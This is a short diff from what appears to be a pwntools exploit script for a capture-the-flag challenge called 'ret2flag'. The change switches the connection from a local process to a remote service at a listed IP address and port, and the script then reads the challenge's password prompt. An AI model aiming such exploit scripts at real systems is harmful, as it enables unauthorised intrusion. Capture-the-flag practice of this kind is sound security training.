@@ -7,8 +7,8 @@ elf = context.binary
 context.log_level = 'debug'
 
 # Choose between local or remote exploitation
-# p = remote('140.113.207.245', 30174)
-p = process('./ret2flag')
+p = remote('140.113.207.245', 30174)
+# p = process('./ret2flag')
 
 # Receive the initial prompt
 p.recvuntil(b"Here is another password checker, you got 5 chances to try\n")
